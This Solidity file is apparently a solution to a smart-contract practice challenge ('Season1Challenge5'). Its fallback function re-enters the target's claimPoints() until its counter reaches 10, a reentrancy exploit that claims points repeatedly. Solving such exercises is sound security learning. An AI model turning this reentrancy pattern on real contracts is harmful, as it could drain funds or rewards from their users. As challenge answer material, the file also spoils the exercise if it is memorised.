//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "./Season1Challenge5.sol";

contract Season1Challenge5Solution {

    Season1Challenge5 private challenge5;
    uint256 private points;

    constructor(address _season1Challenge5) {
        challenge5 = Season1Challenge5(_season1Challenge5);
    }

    function claim10Points() public {
        points = 1;
        challenge5.claimPoints();
    }

    fallback() external {
        // 1. basecase，如果达到points要求，停止调用
        if (points >= 10) {
            return;
        }
        // 2. 递归的调用claimPoints
        points += 1;
        challenge5.claimPoints();
    }

}
